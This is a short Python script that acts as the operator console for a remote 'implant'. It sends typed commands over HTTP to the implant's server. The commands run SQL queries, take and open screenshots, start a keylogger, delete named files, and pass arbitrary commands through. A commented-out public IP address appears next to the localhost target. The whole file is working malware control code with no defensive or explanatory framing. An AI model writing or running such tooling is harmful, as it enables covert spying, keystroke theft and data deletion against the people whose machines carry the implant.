#!/usr/bin/env python3
import socket
import requests
from urllib.parse import urljoin
import os

host = "localhost"
port = 5000

baseurl = f'http://{host}:{port}'

s = socket.socket()
# host = "18.223.121.137"  # Get local machine name
host = "127.0.0.1"
port = 5000  # Reserve a port for your service
while True:  # Establish connection with client
    message = input("Enter command to the implant")
    if message == "exit":
        break
    if 'sql ' in message:
        query = message.replace('sql ', '').strip()
        ret = requests.post(urljoin(baseurl, "/sql"),params={"parameter": query})
        print(ret.text)
        continue
    if message.strip()=='shot':
        ret = requests.post(urljoin(baseurl, '/shot'))
        data = ret.content
        with open('/tmp/tmp_screenshot.png','wb') as f:
            f.write(data)
        os.system('open /tmp/tmp_screenshot.png')
        continue
    if message.strip() == 'key':
        ret = requests.post(urljoin(baseurl, '/key'))
        if ret.status_code == 200:
            print("key logger started.")
        else:
            print("failed to start keylogger.")
        continue
    if 'delete ' in message:
        filename = message.replace('delete ','').strip()
        ret = requests.post(urljoin(baseurl, '/delete'), json={'filename': filename})
        print(ret.text)
    if " " not in message:
        print("please input the format of [command] [post_body], post body is optional but space is mandatory")
        continue
    command, post_body = message.split(" ", 1)
    r = requests.post("http://{}:{}/{}".format(host, port, command), data={"parameter": post_body})
    print(r.content)
